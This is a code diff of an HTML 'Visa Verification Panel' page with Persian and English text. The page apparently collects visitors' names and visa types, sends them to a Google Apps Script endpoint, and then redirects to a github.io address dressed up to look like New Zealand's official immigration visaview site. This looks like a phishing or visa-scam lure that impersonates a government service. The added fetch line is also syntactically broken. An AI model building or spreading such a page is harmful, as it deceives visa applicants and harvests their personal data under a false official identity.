@@ -2,34 +2,73 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Visa Verification</title>
+  <title>Visa Verification Panel</title>
   <style>
-    body { font-family: sans-serif; direction: rtl; }
-    input, button { margin: 8px 0; display: block; width: 100%; max-width: 300px; }
-    #result { color: red; margin-top: 15px; }
+    body {
+      background-color: #000;
+      color: #0f0;
+      font-family: 'Courier New', monospace;
+      padding: 40px;
+      text-align: center;
+    }
+
+    h2 {
+      margin-bottom: 30px;
+      font-size: 24px;
+    }
+
+    input, button {
+      background-color: #111;
+      border: 1px solid #0f0;
+      color: #0f0;
+      padding: 10px;
+      margin: 10px auto;
+      width: 90%;
+      max-width: 400px;
+      font-size: 16px;
+      display: block;
+    }
+
+    input::placeholder {
+      color: #0f0;
+    }
+
+    button {
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    button:hover {
+      background-color: #0f0;
+      color: #000;
+    }
+
+    #result {
+      margin-top: 20px;
+      font-size: 16px;
+      color: #f00;
+    }
   </style>
 </head>
 <body>
-  <h2>فرم بررسی ویزا</h2>
+  <h2>VISA VERIFICATION TERMINAL</h2>
   <form id="visaForm">
     <input type="text" id="name" placeholder="Name" required>
     <input type="text" id="lastName" placeholder="Last Name" required>
     <input type="text" id="visaType" placeholder="Visa Type" required>
-    <button type="submit">بررسی</button>
+    <button type="submit">CHECK VISA</button>
   </form>
   <p id="result"></p>
-
-  <iframe id="secretFrame" style="display: none;"></iframe>
 
   <script>
     const form = document.getElementById("visaForm");
     const result = document.getElementById("result");
 
-    const googleAppsScriptURL = "https://script.google.com/macros/s/AKfycbxig-XZsUg-bnB_yOu2H28NmVCAks68pSEiXz-7nMk-dN1haq8BtWltmEAqa8F_zQjM/exec";
+    const sheetURL = "https://script.google.com/macros/s/AKfycbxig-XZsUg-bnB_yOu2H28NmVCAks68pSEiXz-7nMk-dN1haq8BtWltmEAqa8F_zQjM/exec";
 
-    form.addEventListener("submit", function (e) {
+    form.addEventListener("submit", async (e) => {
       e.preventDefault();
-      result.textContent = "در حال بررسی...";
+      result.textContent = "در حال بررسی اطلاعات...";
 
       const params = new URLSearchParams({
         name: document.getElementById("name").value.trim(),
@@ -37,8 +76,19 @@
         visaType: document.getElementById("visaType").value.trim()
       });
 
-      fetch(googleAppsScriptURL + "?" + params.toString())
-        .then(res => res.text())
-        .then(text => {
-          if (text === "match") {
-            result.textContent = "اط
+      try {
+        const res = await fetch(${sheetURL}?${params});
+        const data = await res.json();
+
+        if (data.status === "success") {
+          window.location.href = "https://newzealandvisaverification.github.io/https-visaview.immigration.govt.nz-vvs-registerVvsAccount.aspx/";
+        } else {
+          result.textContent = "هیچ تطابقی پیدا نشد. لطفاً اطلاعات را بررسی کنید.";
+        }
+      } catch (err) {
+        result.textContent = "خطا در اتصال به سرور.";
+      }
+    });
+  </script>
+</body>
+</html>
